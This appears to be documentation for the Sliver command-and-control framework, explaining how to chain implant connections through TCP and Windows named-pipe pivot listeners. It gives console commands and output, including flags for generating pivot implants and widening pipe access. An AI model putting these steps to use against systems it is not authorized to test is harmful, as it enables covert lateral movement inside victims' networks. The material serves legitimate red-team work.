⚠️ **IMPORTANT:** Pivots in Sliver are used for specifically pivoting C2 traffic, not to be confused with port forwarding `portfwd`, which is used for tunneling generic tcp connections into a target environment.

⚠️ **IMPORTANT:** Pivots can only be used in "session mode" (we may add beacon support later)

Pivots allow you to create "chains" of implant connections, for example if you're trying to deploy a pivot into a highly restricted subnet that cannot route traffic directly to the internet you can instead create an implant that egresses all traffic via another implant in a less restricted subnet. Sliver v1.5 and later pivots can be arbitrarily nested, for example a pivot A can connect thru pivot B to a third egress implant.

In Sliver you use an existing session to create a "pivot listener" and then generate new pivots that can connect back to that listener, just as you would with other C2 protocols/endpoints.

Pivots perform an [authenticated peer-to-peer cryptographic key exchange](/docs?name=Transport+Encryption) regardless of the underlying pivot protocol, therefore pivots can only communicate with other implants generated by the same server; this restriction cannot be disabled.

## TCP Pivots

TCP pivots are implemented in pure Go and are supported on all platforms.

```
[server] sliver (PRIOR_MANTEL) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

[server] sliver (PRIOR_MANTEL) > pivots

 ID   Protocol   Bind Address   Number Of Pivots
==== ========== ============== ==================
  1   TCP        :9898                         0
```

We can now use `generate --tcp-pivot 192.168.1.1:9898` to generate an implant that will connect to the pivot listener, where `192.168.1.1` is the local IP of the server on which we started the listener.

## Named Pipe Pivots (SMB)

Named pipe pivots are only supported on Windows. Select a session to start a named pipe listener, and then use the `--bind` flag to specify a pipe name. Pipes are automatically started on the local machine so you only need to specify a name, remote clients are always allowed to connect to the pipe, but the default ACL will only allow the current user/group. You can allow all user/groups by using the `--allow-all` flag:

```
[*] Session a2615359 WARM_DRIVEWAY - 192.168.1.178:59290 (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:09:20 CST

[server] sliver > use a2615359-b0a4-4463-820b-f4dbe6fb2c30

[*] Active session WARM_DRIVEWAY (a2615359-b0a4-4463-820b-f4dbe6fb2c30)

[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar

[*] Started named pipe pivot listener \\.\pipe\foobar with id 1
```

Next we generate a named pipe implant using `generate --named-pipe 192.168.1.1/pipe/foobar` note here we may need to specify the IP address of the listener: `192.168.1.1`. The syntax is `<host>/pipe/<pipe name>`, note that `.` is equivalent to `127.0.0.1`. This is just the standard syntax for Windows named pipes.

⚠️ **IMPORTANT:** In some environments you may need to use the `--allow-all` flag when starting the pviot listener to allow all users/groups
